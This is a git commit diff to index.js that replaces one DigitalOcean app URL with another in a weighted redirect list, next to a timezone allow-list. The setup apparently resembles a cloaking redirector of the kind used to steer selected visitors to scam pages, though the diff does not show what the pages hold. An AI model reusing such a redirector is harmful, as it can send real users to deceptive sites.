91a32522fa85d3ece28fbaf777f21017ea7afb2c
paalakash <palaksh452@gmail.com>
2026-07-03 08:09:20 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://lionfish-app-3tvit.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://jellyfish-app-29vno.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
 
 ];
 
